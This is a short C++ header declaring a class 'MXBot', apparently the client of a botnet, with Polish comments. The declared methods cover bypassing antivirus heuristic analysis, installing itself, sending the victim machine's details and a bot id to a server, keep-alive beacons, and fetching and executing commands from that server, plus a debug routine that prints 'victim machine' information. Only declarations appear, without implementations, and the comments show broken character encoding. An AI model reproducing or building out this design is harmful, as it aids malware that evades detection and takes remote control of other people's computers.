#pragma once
#include "stdafx.h"
class MXBot
{
public:
	MXBot();
	~MXBot();
	
	void BypassModule();// W³¹cza modu³ omijaj¹cy analizy heurystyczne
	void ActivateInstallationModule();// W³¹cza modu³ instalacyjny	
	void SendPayloadOfTheDay();// Wyœlij payload of the day -> informacje o maszynie, wersji bota oraz jego id
	void SendKeepAlive();// Wysy³a wiadomoœæ typu Keep-Alive
	void CheckCommandsAndMakeThem();// Sprawdza obecnoœæ rozkazów na serwerze i wykonuje je, jeœli istniej¹
#ifdef DMODE
	void WriteVictimMachineInfoToConsole();// Wypisuje informacje o maszynie ofiary na ekran
#endif
};

